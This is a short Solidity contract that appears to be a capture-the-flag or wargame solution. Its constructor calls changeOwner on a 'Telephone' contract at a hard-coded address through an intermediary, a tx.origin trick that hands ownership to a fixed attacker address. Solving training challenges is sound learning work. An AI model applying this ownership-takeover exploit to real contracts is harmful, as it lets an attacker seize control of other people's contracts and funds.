pragma solidity ^0.4.19;

contract Telephone {
  function changeOwner(address _owner) public;
}

contract Relay{
  Telephone telephone;

  function Relay() public {
    telephone = Telephone(0x0E4d2F2A5a0d1c14Aa8d710F7aB4Bb38FE67158F);
    telephone.changeOwner(0xB8966fe6CF9a8d91689b5a6b4f5a4470C0Bfd283);
  }

}
